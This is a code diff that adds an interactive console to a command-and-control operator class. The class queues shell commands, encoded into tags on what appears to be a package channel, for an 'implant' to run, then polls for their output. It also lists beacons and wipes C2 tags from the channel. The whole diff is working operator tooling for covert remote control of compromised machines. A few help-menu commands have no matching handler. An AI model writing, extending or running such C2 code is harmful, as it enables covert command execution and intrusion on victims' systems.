@@ -24,9 +24,10 @@ class Operator:
             "Authorization": f"Bearer {token}",
             "User-Agent": UA,
         })
+        self.consumed: set[str] = set()
 
     # ------------------------------------------------------------ commands
-    def push_task(self, command):
+    def push_task(self, command, quiet=False):
         ok = True
         for tag in encode_payload(command.encode(), CMD_PREFIX):
             try:
@@ -39,11 +40,35 @@ class Operator:
                 print(f"[-] {tag}: HTTP {r.status_code} {body}", file=sys.stderr)
                 ok = False
                 break
-            print(f"[+] {tag}")
+            if not quiet:
+                print(f"[+] {tag}")
         return ok
 
+    def run_command(self, command, timeout=120.0, interval=3.0, quiet=False):
+        """Queue one command and wait for its output.
+
+        Returns the decoded text, or None on timeout. This is the interactive
+        path: one call per command, no manual poll loop.
+        """
+        baseline = set(self._fetch())
+        if not self.push_task(command, quiet=quiet):
+            return None
+        if not quiet:
+            print(f"[*] waiting up to {timeout}s for output")
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            time.sleep(interval)
+            tags = self._fetch()
+            new = {t: v for t, v in tags.items() if t not in baseline}
+            for buf, complete in group_chunks(new, RES_PREFIX):
+                if complete:
+                    self.consumed.update(
+                        t for t in new if t.startswith(RES_PREFIX))
+                    return buf.decode("utf-8", errors="replace")
+        return None
+
     # ------------------------------------------------------------- results
-    def poll_results(self):
+    def poll_results(self, unread_only=False):
         tags = self._fetch()
         found = 0
         for buf, complete in group_chunks(tags, RES_PREFIX):
@@ -56,7 +81,7 @@ class Operator:
         if not found:
             print("[i] no results")
 
-    def watch(self, interval=5):
+    def watch(self, interval=5.0):
         seen: set[str] = set()
         print(f"[*] watching (every {interval}s)")
         try:
@@ -72,6 +97,56 @@ class Operator:
                 time.sleep(interval)
         except KeyboardInterrupt:
             print("\n[*] stopped")
+
+    def interact(self, interval=5.0, timeout=120.0):
+        """A thin console: type a command, get its output, repeat."""
+        print(f"[*] interactive channel on {self.package}")
+        print("[*] commands: any shell line, or :help for meta-commands")
+        try:
+            while True:
+                try:
+                    line = input("c2> ")
+                except EOFError:
+                    print()
+                    break
+                if not line.strip():
+                    continue
+                if line.startswith(":"):
+                    self._meta(line, timeout)
+                    continue
+                out = self.run_command(line, timeout=timeout,
+                                       interval=interval, quiet=False)
+                if out is None:
+                    print("[!] no output before the timeout; check `stats`")
+                else:
+                    print(out)
+        except KeyboardInterrupt:
+            print("\n[*] detached (implant keeps polling)")
+
+    def _meta(self, line, timeout):
+        cmd, _, arg = line[1:].partition(" ")
+        cmd = cmd.strip().lower()
+        if cmd in ("q", "quit", "exit"):
+            raise KeyboardInterrupt
+        if cmd == "help":
+            print("  :stats          tag counts")
+            print("  :beacons        heartbeat tags")
+            print("  :poll           print all results")
+            print("  :wait <sec>     change the per-command timeout")
+            print("  :interval <sec> change the poll interval")
+            print("  :clean          remove c2 tags from the channel")
+            print("  :quit")
+            return
+        if cmd == "stats":
+            self.stats()
+        elif cmd == "beacons":
+            self.list_beacons()
+        elif cmd == "poll":
+            self.poll_results()
+        elif cmd == "clean":
+            self.clean_tags()
+        else:
+            print(f"[!] unknown meta-command :{cmd}")
 
     def list_beacons(self):
         names = [t for t in self._fetch() if t.startswith(HBT_PREFIX)]
